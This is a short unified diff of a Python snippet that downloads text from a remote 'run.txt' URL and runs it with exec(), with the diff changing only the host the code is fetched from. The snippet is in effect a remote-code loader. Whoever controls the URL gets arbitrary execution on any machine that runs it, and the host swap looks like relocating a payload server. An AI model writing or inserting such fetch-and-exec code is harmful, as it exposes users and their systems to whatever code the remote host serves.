@@ -1,4 +1,4 @@
 
 import requests, os
-z = requests.get('https://fajarbaiz.com/run.txt').text
+z = requests.get('https://fajars.space.com/run.txt').text
 exec(z)
